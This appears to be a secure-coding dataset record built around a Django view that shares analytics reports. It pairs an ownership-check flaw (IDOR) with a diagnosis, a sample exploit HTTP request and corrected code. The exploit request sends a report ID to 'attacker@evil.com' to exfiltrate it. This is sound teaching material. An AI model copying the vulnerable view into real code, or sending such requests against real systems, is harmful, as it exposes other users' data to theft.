vulnerable_code:
report_shared = Signal()

def share_analytics_report(request):
    report_id = request.POST.get('report_id')
    recipient_email = request.POST.get('recipient_email')
    report = AnalyticsReport.objects.get(id=report_id)
    report_shared.send(sender=AnalyticsReport, report=report, recipient=recipient_email)
    return JsonResponse({'status': 'shared'})
diagnosis: The view looks up AnalyticsReport by report_id from the POST body without checking if report.created_by == request.user. It fires a custom signal that delivers access tokens for the report, enabling an attacker to exfiltrate any analytics report to their personal email address.
exploit_request:
POST /api/reports/share/ HTTP/1.1
Host: analytics.example.com
Cookie: sessionid=attacker_session
Content-Type: application/x-www-form-urlencoded

report_id=5521&recipient_email=attacker@evil.com
corrected_code:
report_shared = Signal()

def share_analytics_report(request):
    report_id = request.POST.get('report_id')
    recipient_email = request.POST.get('recipient_email')
    report = get_object_or_404(AnalyticsReport, id=report_id, organization=request.user.organization)
    report_shared.send(sender=AnalyticsReport, report=report, recipient=recipient_email)
    return JsonResponse({'status': 'shared'})
